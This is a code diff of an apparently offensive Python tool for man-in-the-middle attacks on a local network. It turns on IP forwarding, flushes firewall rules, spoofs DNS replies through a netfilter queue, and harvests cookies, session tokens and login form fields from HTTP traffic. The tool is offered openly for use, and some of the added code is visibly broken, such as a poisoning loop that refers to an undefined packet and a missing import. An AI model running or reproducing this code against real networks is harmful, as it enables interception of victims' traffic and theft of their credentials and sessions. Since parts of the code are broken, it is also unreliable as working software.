@@ -10,9 +10,9 @@ import os
 import platform
 import ctypes
 import subprocess
-from flask import Flask, render_template_string, request, redirect, url_for
-import threading
-import time
+from netfilterqueue import NetfilterQueue
+import json
+import re
 
 # Check platform and privileges
 if platform.system() == "Windows":
@@ -33,61 +33,62 @@ parser.add_argument('--iface', help='Network interface to use', required=True)
 parser.add_argument('--routerip', help='IP of your home router', required=True)
 opts = parser.parse_args()
 
-# Flask app for HTTP modification
-app = Flask(__name__)
-http_urls = []
+# Custom DNS response database (can be expanded)
+DNS_DB = {
+    'google.com': '8.8.8.8',
+    'facebook.com': '157.240.22.35',
+}
 
-@app.route('/')
-def home():
-    return render_template_string("""
-    <html>
-    <body>
-        <h1>Captured HTTP Requests</h1>
-        <ul>
-        {% for url in urls %}
-            <li><a href="{{ url_for('modify', url=url) }}">{{ url }}</a></li>
-        {% endfor %}
-        </ul>
-    </body>
-    </html>
-    """, urls=http_urls)
+# Capturing HTTP session cookies, tokens, and form data
+class HTTP_SessionHijacker:
+    @staticmethod
+    def capture_http(pkt):
+        if pkt.haslayer('Raw'):
+            raw_data = pkt['Raw'].load.decode(errors='ignore')
+            cookies = re.findall(r'Cookie: (.*?)\r\n', raw_data)
+            tokens = re.findall(r'(session|token|auth)\s*=\s*([^;]+)', raw_data, re.IGNORECASE)
+            
+            # Capture cookies
+            for cookie in cookies:
+                print(f"{Fore.RED}Captured Cookie: {cookie}{Style.RESET_ALL}")
+            
+            # Capture session tokens
+            for token in tokens:
+                print(f"{Fore.YELLOW}Captured Token: {token[1]}{Style.RESET_ALL}")
 
-@app.route('/modify', methods=["GET", "POST"])
-def modify():
-    url = request.args.get('url')
-    if request.method == 'POST':
-        new_content = request.form['new_content']
-        print(f"Modifying URL {url} with new content: {new_content}")
-        # Logic to modify the content will go here
-        return redirect(url_for('home'))
-    
-    return render_template_string("""
-    <html>
-    <body>
-        <h1>Modify Request for {{ url }}</h1>
-        <form method="post">
-            <textarea name="new_content" rows="10" cols="50"></textarea><br>
-            <button type="submit">Submit</button>
-        </form>
-    </body>
-    </html>
-    """, url=url)
+            # Capture form data in POST requests
+            if "POST" in raw_data:
+                if any(k in raw_data.lower() for k in ['username', 'user', 'login', 'email']) and \
+                   any(k in raw_data.lower() for k in ['password', 'pass', 'pwd']):
+                    print(f"{Fore.RED}[!] Possible Credentials Found:{Style.RESET_ALL}")
+                    for line in raw_data.split('\r\n'):
+                        if '=' in line and len(line) < 100:
+                            print(f"{Fore.YELLOW}    {line}{Style.RESET_ALL}")
 
-def arp_scan(network, iface):
-    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network),
-                 timeout=5, iface=iface, verbose=False)
-    print(f'\n{Fore.RED}######## NETWORK DEVICES ########{Style.RESET_ALL}\n')
-    for i in ans:
-        mac = i.answer[ARP].hwsrc
-        ip = i.answer[ARP].psrc
-        try:
-            vendor = MacLookup().lookup(mac)
-        except VendorNotFoundError:
-            vendor = 'unrecognized device'
-        print(f'{Fore.BLUE}{ip}{Style.RESET_ALL} ({mac}, {vendor})')
-    print(f'{Fore.YELLOW}0. Exit{Style.RESET_ALL}')
-    return input('\nPick a device IP: ')
+# DNS Spoofing Class
+class DNS_Spoofer:
+    @staticmethod
+    def spoof_dns(pkt, spoof_ip):
+        if pkt.haslayer(DNS) and pkt[DNS].qr == 0:  # DNS query
+            domain = pkt[DNS].qd.qname.decode('utf-8').strip('.')
+            if domain in DNS_DB:
+                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
+                              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
+                              DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
+                                  an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=DNS_DB[domain]))
+                send(spoofed_pkt, iface=opts.iface, verbose=False)
+                print(f'{Fore.RED}DNS Poison: Redirected {domain} to {DNS_DB[domain]}{Style.RESET_ALL}')
 
+# DNS Cache Poisoning
+class DNS_CachePoisoning:
+    @staticmethod
+    def start_dns_cache_poisoning(spoof_ip, interval=60):
+        """ Periodically respoof DNS to maintain cache poisoning """
+        while True:
+            DNS_Spoofer.spoof_dns(pkt, spoof_ip)
+            time.sleep(interval)  # Wait before respoofing
+
+# Define the main device handler
 class Device:
     def __init__(self, routerip, targetip, iface):
         self.routerip = routerip
@@ -118,55 +119,23 @@ class Device:
         sniff(iface=self.iface, prn=arp_pkt_callback,
               filter=f'arp and host {self.targetip}', store=0)
 
-    def http_sniff(self, pkt):
-        def http_pkt_callback(pkt):
-            if pkt.haslayer('Raw'):
-                raw_data = pkt['Raw'].load.decode(errors='ignore')
-                if "POST" in raw_data or "GET" in raw_data:
-                    if "Host:" in raw_data and "GET" in raw_data:
-                        try:
-                            host = raw_data.split("Host: ")[1].split("\r\n")[0]
-                            path = raw_data.split("GET ")[1].split(" HTTP")[0]
-                            url = f"http://{host}{path}"
-                            print(f"{Fore.CYAN}Captured URL: {url}{Style.RESET_ALL}")
-                            http_urls.append(url)  # Add captured URL to the list
-                        except Exception:
-                            pass
-
-                    if "POST" in raw_data:
-                        if any(k in raw_data.lower() for k in ['username', 'user', 'login', 'email']) and \
-                           any(k in raw_data.lower() for k in ['password', 'pass', 'pwd']):
-                            print(f"{Fore.RED}[!] Possible Credentials Found:{Style.RESET_ALL}")
-                            for line in raw_data.split('\r\n'):
-                                if '=' in line and len(line) < 100:
-                                    print(f"{Fore.YELLOW}    {line}{Style.RESET_ALL}")
-
-        sniff(iface=self.iface, prn=http_pkt_callback,
+    def http_sniff(self):
+        sniff(iface=self.iface, prn=HTTP_SessionHijacker.capture_http,
               filter=f'tcp port 80 and host {self.targetip}', store=0)
 
     def enable_ip_forwarding(self):
-        # Enable IP forwarding using subprocess
         subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
         print(f'{Fore.GREEN}IP forwarding enabled!{Style.RESET_ALL}')
 
     def set_iptables(self):
-        # Use iptables to forward packets to NFQUEUE
         subprocess.call(f"iptables --flush", shell=True)
         subprocess.call(f"iptables -A FORWARD -j NFQUEUE --queue-num 0", shell=True)
         print(f'{Fore.GREEN}Iptables rules set to forward packets to NFQUEUE 0.{Style.RESET_ALL}')
 
     def dns_poison(self, spoof_ip):
         def dns_pkt_callback(pkt):
-            if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
-                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
-                              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
-                              DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
-                                  an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoof_ip))
-                send(spoofed_pkt, iface=self.iface, verbose=False)
-                print(f'{Fore.RED}DNS Poison: Redirected {pkt[DNS].qd.qname.decode()} to {spoof_ip}{Style.RESET_ALL}')
+            DNS_Spoofer.spoof_dns(pkt, spoof_ip)
         
-        # Set up NFQUEUE for DNS packets
-        from netfilterqueue import NetfilterQueue
         nfqueue = NetfilterQueue()
         nfqueue.bind(0, dns_pkt_callback)
         print(f'{Fore.GREEN}Listening for DNS packets in NFQUEUE...{Style.RESET_ALL}')
@@ -175,7 +144,7 @@ class Device:
     def sniff(self):
         while True:
             print(f'\n{Fore.GREEN}Select Your Choice:{Style.RESET_ALL}')
-            print(f'1. DNS Sniff\n2. HTTP Sniff\n3. DNS Poison\n4. HTTP Request Modification\n5. Exit')
+            print(f'1. DNS Sniff\n2. HTTP Sniff\n3. DNS Poison\n4. ARP Sniff\n5. Exit')
             try:
                 choice = int(input(f'{Fore.BLUE}Your choice: {Style.RESET_ALL}'))
             except ValueError:
@@ -189,10 +158,7 @@ class Device:
                 spoof_ip = input(f'{Fore.RED}Enter spoofed IP: {Style.RESET_ALL}')
                 self.dns_poison(spoof_ip)
             elif choice == 4:
-                print(f'{Fore.CYAN}Opening HTTP Request Modification Web Control...{Style.RESET_ALL}')
-                threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000)).start()
-                time.sleep(2)  # Give Flask time to start
-                print(f"{Fore.CYAN}You can now view the captured URLs and modify them at http://localhost:5000{Style.RESET_ALL}")
+                self.arp_sniff()
             elif choice == 5:
                 print(f'{Fore.YELLOW}Exiting...{Style.RESET_ALL}')
                 break
